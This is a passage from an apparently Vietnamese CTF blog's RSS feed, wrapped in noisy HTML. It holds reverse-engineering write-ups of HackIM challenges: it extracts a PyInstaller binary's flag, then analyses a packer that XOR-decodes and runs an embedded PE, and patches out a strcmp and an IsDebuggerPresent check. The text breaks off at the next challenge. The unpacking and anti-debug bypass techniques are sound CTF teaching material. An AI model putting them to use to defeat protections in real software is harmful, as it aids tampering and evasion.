data-large-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/02/Screen-Shot-2015-02-01-at-9.18.50-PM.png?fit=604%2C258&amp;ssl=1" class="alignnone size-medium wp-image-289" src="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/02/Screen-Shot-2015-02-01-at-9.18.50-PM.png?resize=300%2C128&#038;ssl=1" alt="Screen Shot 2015-02-01 at 9.18.50 PM" width="300" height="128" srcset="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/02/Screen-Shot-2015-02-01-at-9.18.50-PM.png?resize=300%2C128&amp;ssl=1 300w, https://i2.wp.com/babyphd.net/wp-content/uploads/2015/02/Screen-Shot-2015-02-01-at-9.18.50-PM.png?resize=1024%2C438&amp;ssl=1 1024w, https://i2.wp.com/babyphd.net/wp-content/uploads/2015/02/Screen-Shot-2015-02-01-at-9.18.50-PM.png?w=1266&amp;ssl=1 1266w, https://i2.wp.com/babyphd.net/wp-content/uploads/2015/02/Screen-Shot-2015-02-01-at-9.18.50-PM.png?w=1208&amp;ssl=1 1208w" sizes="(max-width: 300px) 100vw, 300px" data-recalc-dims="1" /></a></p>
+<p><a href="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/02/Screen-Shot-2015-02-01-at-9.19.00-PM.png?ssl=1"><img data-attachment-id="290" data-permalink="https://babyphd.net/2015/02/01/whitehat-contest-8-pwn200pwn500-writeup/screen-shot-2015-02-01-at-9-19-00-pm/" data-orig-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/02/Screen-Shot-2015-02-01-at-9.19.00-PM.png?fit=1262%2C554&amp;ssl=1" data-orig-size="1262,554" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Screen Shot 2015-02-01 at 9.19.00 PM" data-image-description="" data-medium-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/02/Screen-Shot-2015-02-01-at-9.19.00-PM.png?fit=300%2C132&amp;ssl=1" data-large-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/02/Screen-Shot-2015-02-01-at-9.19.00-PM.png?fit=604%2C265&amp;ssl=1" class="alignnone size-medium wp-image-290" src="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/02/Screen-Shot-2015-02-01-at-9.19.00-PM.png?resize=300%2C132&#038;ssl=1" alt="Screen Shot 2015-02-01 at 9.19.00 PM" width="300" height="132" srcset="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/02/Screen-Shot-2015-02-01-at-9.19.00-PM.png?resize=300%2C132&amp;ssl=1 300w, https://i0.wp.com/babyphd.net/wp-content/uploads/2015/02/Screen-Shot-2015-02-01-at-9.19.00-PM.png?resize=1024%2C450&amp;ssl=1 1024w, https://i0.wp.com/babyphd.net/wp-content/uploads/2015/02/Screen-Shot-2015-02-01-at-9.19.00-PM.png?w=1262&amp;ssl=1 1262w, https://i0.wp.com/babyphd.net/wp-content/uploads/2015/02/Screen-Shot-2015-02-01-at-9.19.00-PM.png?w=1208&amp;ssl=1 1208w" sizes="(max-width: 300px) 100vw, 300px" data-recalc-dims="1" /></a></p>
+<p><img class="alignnone" src="https://i1.wp.com/pik.vn/201440f654df-bbda-4c1b-abdd-c938bc30445b.gif?resize=450%2C307" alt="" width="450" height="307" data-recalc-dims="1" /></p>
+]]></content:encoded>
+							<wfw:commentRss>https://babyphd.net/2015/02/01/whitehat-contest-8-pwn200pwn500-writeup/feed/</wfw:commentRss>
+		<slash:comments>1</slash:comments>
+						<post-id xmlns="com-wordpress:feed-additions:1">288</post-id>	</item>
+		<item>
+		<title>[HackIM 2014] RE + Pwn MentalNote</title>
+		<link>https://babyphd.net/2015/01/13/hackim-2014-re-pwn-mentalnote/</link>
+				<pubDate>Tue, 13 Jan 2015 01:58:34 +0000</pubDate>
+		<dc:creator><![CDATA[Trí Chim Trích]]></dc:creator>
+				<category><![CDATA[pwn]]></category>
+		<category><![CDATA[re]]></category>
+		<category><![CDATA[Uncategorized]]></category>
+		<category><![CDATA[list-linked]]></category>
+		<category><![CDATA[side-channel]]></category>
+
+		<guid isPermaLink="false">https://babyphd.net/?p=259</guid>
+				<description><![CDATA[RE 100 - boo binary khá nặng C:\Users\chim\Desktop\nullcon\re\boo&#62;trid boo TrID/32 - File Identifier v2.10 - (C) 2003-11 By M.Pontello Collecting data from file: boo 100.0% (.) Mac OS X Mach-O 64bit Intel executable (4000/1) =&#62; Mac OS Binary kernel Mach 64 bit Check string 1 tí thì thấy UPX 3.91!. Ok thử decompress nào C:\Users\chim\Desktop\nullcon\re\boo&#62;upx -d &#8230; <a href="https://babyphd.net/2015/01/13/hackim-2014-re-pwn-mentalnote/" class="more-link">Continue reading <span class="screen-reader-text">[HackIM 2014] RE + Pwn MentalNote</span> <span class="meta-nav">&#8594;</span></a>]]></description>
+								<content:encoded><![CDATA[<h2><span style="color: #3366ff;">RE 100 - boo</span></h2>
+<p>binary khá nặng</p>
+<pre class="lang:default decode:true">C:\Users\chim\Desktop\nullcon\re\boo&gt;trid boo
+
+TrID/32 - File Identifier v2.10 - (C) 2003-11 By M.Pontello
+
+Collecting data from file: boo
+100.0% (.) Mac OS X Mach-O 64bit Intel executable (4000/1)</pre>
+<p>=&gt; Mac OS Binary kernel Mach 64 bit</p>
+<p>Check string 1 tí thì thấy UPX 3.91!. Ok thử decompress nào</p>
+<pre class="lang:default decode:true">C:\Users\chim\Desktop\nullcon\re\boo&gt;upx -d boo
+                       Ultimate Packer for eXecutables
+                          Copyright (C) 1996 - 2013
+UPX 3.91w       Markus Oberhumer, Laszlo Molnar &amp; John Reiser   Sep 30th 2013
+
+        File size         Ratio      Format      Name
+   --------------------   ------   -----------   -----------
+upx: boo: NotPackedException: not packed by UPX
+
+Unpacked 0 files.</pre>
+<p>Failed!</p>
+<p>Check lại string lần nữa để ý thấy cái zlib.so, struct.so, python ME... nghi ngờ thể loại python-&gt;bin quá.</p>
+<p>Find header PYZ =&gt; founded :yolo:</p>
+<p><a href="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/boo_3.png?ssl=1"><img data-attachment-id="262" data-permalink="https://babyphd.net/2015/01/13/hackim-2014-re-pwn-mentalnote/boo_3/" data-orig-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/boo_3.png?fit=608%2C72&amp;ssl=1" data-orig-size="608,72" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="boo_3" data-image-description="" data-medium-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/boo_3.png?fit=300%2C36&amp;ssl=1" data-large-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/boo_3.png?fit=604%2C72&amp;ssl=1" class="alignnone size-full wp-image-262" src="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/boo_3.png?resize=604%2C72&#038;ssl=1" alt="boo_3" width="604" height="72" srcset="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/boo_3.png?w=608&amp;ssl=1 608w, https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/boo_3.png?resize=300%2C36&amp;ssl=1 300w" sizes="(max-width: 604px) 100vw, 604px" data-recalc-dims="1" /></a></p>
+<p>Ok easy roài, extract data python ra thôi - <a title="Link" href="http://reverseengineering.stackexchange.com/questions/160/how-do-you-reverse-engineer-an-exe-compiled-with-pyinstaller" target="_blank">Link</a></p>
+<pre class="lang:python decode:true ">import sys
+
+if len(sys.argv) == 13:
+	print "Great: flag{g3771ng_st4rt3d_2015}"
+else:
+	print "."</pre>
+<p>-------------------------------------------------------------------------------------------------------</p>
+<h2><span style="color: #3366ff;">RE 200 - upx.exe</span></h2>
+<p>string thử chả thấy cái UPX! signature nào @@. decompress lại cho chắc failed nốt.</p>
+<p><a href="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_1.png?ssl=1"><img data-attachment-id="263" data-permalink="https://babyphd.net/2015/01/13/hackim-2014-re-pwn-mentalnote/upx_1/" data-orig-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_1.png?fit=631%2C125&amp;ssl=1" data-orig-size="631,125" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="upx_1" data-image-description="" data-medium-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_1.png?fit=300%2C59&amp;ssl=1" data-large-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_1.png?fit=604%2C120&amp;ssl=1" class="alignnone size-full wp-image-263" src="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_1.png?resize=604%2C120&#038;ssl=1" alt="upx_1" width="604" height="120" srcset="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_1.png?w=631&amp;ssl=1 631w, https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_1.png?resize=300%2C59&amp;ssl=1 300w" sizes="(max-width: 604px) 100vw, 604px" data-recalc-dims="1" /></a></p>
+<p>Run</p>
+<p><a href="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_2.png?ssl=1"><img data-attachment-id="264" data-permalink="https://babyphd.net/2015/01/13/hackim-2014-re-pwn-mentalnote/upx_2/" data-orig-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_2.png?fit=176%2C153&amp;ssl=1" data-orig-size="176,153" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="upx_2" data-image-description="" data-medium-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_2.png?fit=176%2C153&amp;ssl=1" data-large-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_2.png?fit=176%2C153&amp;ssl=1" class="alignnone size-full wp-image-264" src="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_2.png?resize=176%2C153&#038;ssl=1" alt="upx_2" width="176" height="153" data-recalc-dims="1" /></a></p>
+<p><em>OK boy let's make it nicely!</em></p>
+<p>Bật IDA Disass thấy đây là 1 binary MS C++ bình thường.</p>
+<p>main là winMain -&gt; sau đó call hàm sub_4001000</p>
+<pre class="height-set:true lang:c decode:true">int __stdcall wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLine, int nShowCmd)
+{
+    sub_401000();
+    return 0;
+}
+
+void *__cdecl sub_401000()
+{
+    void *result; // eax@1
+    void *MZ_header; // ecx@1
+    int v2; // ecx@4
+    int v3; // ebp@4
+    int v4; // esi@4
+    int v5; // ebx@4
+    const char *v6; // edi@5
+    unsigned int v7; // edi@9
+    int v8; // ebx@9
+    HANDLE v9; // eax@9
+    void *v10; // esi@9
+    unsigned int v11; // eax@10
+    HANDLE v12; // eax@12
+    int v13; // ebx@12
+    SIZE_T v14; // [sp+0h] [bp-28h]@1
+    int v15; // [sp+4h] [bp-24h]@14
+    int v16; // [sp+8h] [bp-20h]@14
+    int v17; // [sp+Ch] [bp-1Ch]@14
+    int v18; // [sp+10h] [bp-18h]@14
+    int v19; // [sp+14h] [bp-14h]@14
+    SIZE_T v20; // [sp+18h] [bp-10h]@14
+    int v21; // [sp+1Ch] [bp-Ch]@14
+    int v22; // [sp+20h] [bp-8h]@14
+    int v23; // [sp+24h] [bp-4h]@14
+
+    result = GetModuleHandleW(0);
+    MZ_header = result;
+    v14 = (SIZE_T)result;
+    if ( result )
+    {
+        result = (void *)'ZM';
+        if ( *(_WORD *)MZ_header == 'ZM' )
+        {
+            result = (char *)MZ_header + *((_DWORD *)MZ_header + 15);
+            if ( *(_DWORD *)result == 'EP' )
+            {
+                v2 = *((_WORD *)result + 10);
+                v3 = *((_WORD *)result + 3);
+                v4 = 0;
+                v5 = (int)((char *)result + v2 + 24);
+                if ( v3 &gt; 0 )
+                {
+                    v6 = (char *)result + v2 + 24;
+                    while ( 1 )
+                    {
+                        result = (void *)strcmp(v6, ".reloc");
+                        if ( !result )
+                            break;
+                        ++v4;
+                        v6 += 40;
+                        if ( v4 &gt;= v3 )
+                            return result;
+                    }
+                    v7 = *(_DWORD *)(v5 + 40 * v4 + 16);
+                    v8 = v5 + 40 * v4;
+                    v9 = GetProcessHeap();
+                    result = HeapAlloc(v9, 8u, v7 + 1);
+                    v10 = result;
+                    if ( result )
+                    {                                           // malloc, copy hex sang cho malloc 6600
+                        unknown_libname_41(result, v14 + *(_DWORD *)(v8 + 12), *(_DWORD *)(v8 + 16));
+                        v11 = 0;
+                        if ( v7 )
+                        {
+                            do
+                                *((_BYTE *)v10 + v11++) ^= 0x11u;
+                            while ( v11 &lt; v7 );
+                        }
+                        v14 = *(_DWORD *)v10;
+                        v12 = GetProcessHeap();
+                        result = HeapAlloc(v12, 8u, v14);
+                        v13 = (int)result;
+                        if ( result )
+                        {
+                            result = (void *)sub_406660((int)((char *)v10 + 4), (int)result, v7 - 4, (int)&amp;v14);
+                            if ( !result )
+                            {
+                                v18 = 0;
+                                v15 = 0;
+                                v16 = 0;
+                                v17 = 0;
+                                v21 = 0;
+                                v22 = 0;
+                                v23 = 0;
+                                v20 = v14;
+                                v19 = v13;
+                                LOBYTE(v18) = 1;
+                                sub_401B60((int)&amp;v15);
+                                ExitProcess(1u);
+                            }
+                        }
+                    }
+                }
+            }
+        }
+    }
+    return result;
+}</pre>
+<p>đầu tiên nó gọi hàm getModuleHandle để tìm base address của MZ Header<br />
+sau đó check MZ signature và PE signature ::for sure::</p>
+<p><a href="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_3.png?ssl=1"><img data-attachment-id="265" data-permalink="https://babyphd.net/2015/01/13/hackim-2014-re-pwn-mentalnote/upx_3/" data-orig-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_3.png?fit=307%2C254&amp;ssl=1" data-orig-size="307,254" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="upx_3" data-image-description="" data-medium-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_3.png?fit=300%2C248&amp;ssl=1" data-large-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_3.png?fit=307%2C254&amp;ssl=1" class="alignnone size-full wp-image-265" src="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_3.png?resize=307%2C254&#038;ssl=1" alt="upx_3" width="307" height="254" srcset="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_3.png?w=307&amp;ssl=1 307w, https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_3.png?resize=300%2C248&amp;ssl=1 300w" sizes="(max-width: 307px) 100vw, 307px" data-recalc-dims="1" /></a></p>
+<p>find session .alloc</p>
+<p><a href="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_4.png?ssl=1"><img data-attachment-id="266" data-permalink="https://babyphd.net/2015/01/13/hackim-2014-re-pwn-mentalnote/upx_4/" data-orig-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_4.png?fit=347%2C199&amp;ssl=1" data-orig-size="347,199" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="upx_4" data-image-description="" data-medium-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_4.png?fit=300%2C172&amp;ssl=1" data-large-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_4.png?fit=347%2C199&amp;ssl=1" class="alignnone size-full wp-image-266" src="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_4.png?resize=347%2C199&#038;ssl=1" alt="upx_4" width="347" height="199" srcset="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_4.png?w=347&amp;ssl=1 347w, https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_4.png?resize=300%2C172&amp;ssl=1 300w" sizes="(max-width: 347px) 100vw, 347px" data-recalc-dims="1" /></a><a href="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_6.png?ssl=1"><img data-attachment-id="268" data-permalink="https://babyphd.net/2015/01/13/hackim-2014-re-pwn-mentalnote/upx_6/" data-orig-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_6.png?fit=609%2C35&amp;ssl=1" data-orig-size="609,35" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="upx_6" data-image-description="" data-medium-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_6.png?fit=300%2C17&amp;ssl=1" data-large-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_6.png?fit=604%2C35&amp;ssl=1" class="alignnone size-full wp-image-268" src="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_6.png?resize=604%2C35&#038;ssl=1" alt="upx_6" width="604" height="35" srcset="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_6.png?w=609&amp;ssl=1 609w, https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_6.png?resize=300%2C17&amp;ssl=1 300w" sizes="(max-width: 604px) 100vw, 604px" data-recalc-dims="1" /></a></p>
+<pre class="lang:default decode:true">var A = heapalloc(0x6600)</pre>
+<p>đến đoạn unknown_libname_41 này vì mình rất ghét cái gì cứ dấu giếm, và 1 phần nhác trỗi dậy. function thông thường của mscrt thôi nên xem các tham số truyền vô và kết quả trả về để đoán vậy (memcpy)</p>
+<pre class="lang:default decode:true">memcpy(0x41b00, A, 0x6600)
+for i in range(0x6600):
+	A[i] ^= 0x11</pre>
+<p>*một đoạn memory khá dài, lại còn bị mã hóa nữa. không thể nào là flag cipher được? Có lẽ nào là shellcode?</p>
+<pre class="lang:default decode:true">new_size = *(dword*)A = 0xbe00
+var B = heapalloc(new_size)
+sub_406660( &amp;new_size ) =&gt; copy MZ_Header -&gt; đến B, size = 0xbe00</pre>
+<p><a href="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_5.png?ssl=1"><img data-attachment-id="267" data-permalink="https://babyphd.net/2015/01/13/hackim-2014-re-pwn-mentalnote/upx_5/" data-orig-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_5.png?fit=468%2C132&amp;ssl=1" data-orig-size="468,132" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="upx_5" data-image-description="" data-medium-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_5.png?fit=300%2C85&amp;ssl=1" data-large-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_5.png?fit=468%2C132&amp;ssl=1" class="alignnone size-full wp-image-267" src="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_5.png?resize=468%2C132&#038;ssl=1" alt="upx_5" width="468" height="132" srcset="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_5.png?w=468&amp;ssl=1 468w, https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_5.png?resize=300%2C85&amp;ssl=1 300w" sizes="(max-width: 468px) 100vw, 468px" data-recalc-dims="1" /></a></p>
+<p>Từ đây ta nhảy vào sub func cuối là sub_401b60</p>
+<p>Check các sub phụ, để ý các string mình thấy rất là liên quan</p>
+<pre class="lang:default decode:true">[+] Mapping PE file
+[+] Creating Map View of File
+[+] Map View of File created
+[+] Checking for self relocation
+[+] MyBase, MySize ?!?
+[+] Jumping to relocated image
+[+] Processing IAT
+[+] Loading Library and processing
+[+] Fixing Image Base address in PEB
+[+] Executing Entry Point !!!</pre>
+<p>và 1 số function khá vãi</p>
+<pre class="lang:default decode:true ">- CreateFileMappingW
+- MapViewOfFile
+- VirtualAlloc
+- GetProcAddress
+- VirtualQuery
+- LoadLibraryA
+- VirtualProtect</pre>
+<p>oke, tít đi ít! run shellcode chắc roài ::bem::</p>
+<p>ta đặt breakpoint ở ngay các sub con và run lần lượt đến khi nào shell được chạy thì phát hiện điểm G</p>
+<p><a href="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_7.png?ssl=1"><img data-attachment-id="269" data-permalink="https://babyphd.net/2015/01/13/hackim-2014-re-pwn-mentalnote/upx_7/" data-orig-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_7.png?fit=413%2C56&amp;ssl=1" data-orig-size="413,56" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="upx_7" data-image-description="" data-medium-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_7.png?fit=300%2C41&amp;ssl=1" data-large-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_7.png?fit=413%2C56&amp;ssl=1" class="alignnone size-full wp-image-269" src="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_7.png?resize=413%2C56&#038;ssl=1" alt="upx_7" width="413" height="56" srcset="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_7.png?w=413&amp;ssl=1 413w, https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_7.png?resize=300%2C41&amp;ssl=1 300w" sizes="(max-width: 413px) 100vw, 413px" data-recalc-dims="1" /></a></p>
+<pre class="lang:default decode:true">sub_401b60 -&gt; sub_401600 -&gt; call eax
+new entry point =  08001563</pre>
+<p>sài HxD (hex editor) view ram process upx.exe tại địa chỉ đó thì thấy nguyên session từ 0x08000000 -&gt; 0x0800FFFF là 1 file PE mới,</p>
+<p>search string thì thấy có dòng "You didn't ask nicely" và đặc biệt là "-pl34se-give-me-th3-k3y" :-ss</p>
+<p>tới đây các bạn có thể extract ra 1 file exe mới và disass nghiên cứu (ko chắc là sẽ chạy đc ok), còn mình thì thấy nó có dạng 1 file ms c++ nữa nên so sánh structure với cái PE gốc để tìm addr winMain</p>
+<pre class="lang:default decode:true ">địa chỉ 0x08001100</pre>
+<p>quá trình dịch cũng tương tự, bài mới này cũng không quá khó.</p>
+<pre class="lang:default decode:true ">st = command_line_string
+st[len(st)-1] = \x00
+
+if st[len(st)]==\x20:
+	if !strcmp(st, "-pl34se-give-me-th3-k3y"):
+		func_flag()
+		exit()
+msgbox("You not nicely");</pre>
+<p>patch luôn cho lẹ, patch luôn chỗ strcmp và trong func_flag (0x08001000) có 1 chỗ gọi isDebuggerPresent (0x08001024)</p>
+<p><a href="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_8.png?ssl=1"><img data-attachment-id="270" data-permalink="https://babyphd.net/2015/01/13/hackim-2014-re-pwn-mentalnote/upx_8/" data-orig-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_8.png?fit=421%2C108&amp;ssl=1" data-orig-size="421,108" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="upx_8" data-image-description="" data-medium-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_8.png?fit=300%2C77&amp;ssl=1" data-large-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_8.png?fit=421%2C108&amp;ssl=1" class="alignnone size-full wp-image-270" src="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_8.png?resize=421%2C108&#038;ssl=1" alt="upx_8" width="421" height="108" srcset="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_8.png?w=421&amp;ssl=1 421w, https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_8.png?resize=300%2C77&amp;ssl=1 300w" sizes="(max-width: 421px) 100vw, 421px" data-recalc-dims="1" /></a></p>
+<p><a href="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_9.png?ssl=1"><img data-attachment-id="271" data-permalink="https://babyphd.net/2015/01/13/hackim-2014-re-pwn-mentalnote/upx_9/" data-orig-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_9.png?fit=581%2C138&amp;ssl=1" data-orig-size="581,138" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="upx_9" data-image-description="" data-medium-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_9.png?fit=300%2C71&amp;ssl=1" data-large-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_9.png?fit=581%2C138&amp;ssl=1" class="alignnone size-full wp-image-271" src="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_9.png?resize=581%2C138&#038;ssl=1" alt="upx_9" width="581" height="138" srcset="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_9.png?w=581&amp;ssl=1 581w, https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_9.png?resize=300%2C71&amp;ssl=1 300w" sizes="(max-width: 581px) 100vw, 581px" data-recalc-dims="1" /></a></p>
+<p>Done.</p>
+<p>----------------------------------------------------------------------------------</p>
+<h2><span style="color: #3366ff;">RE 400 - fin64</span></h2>
+<pre class="lang:default decode:true ">ubt64@ubt64-vb:/media/sf_Desktop/nullcon/re/fin64$ file fin64
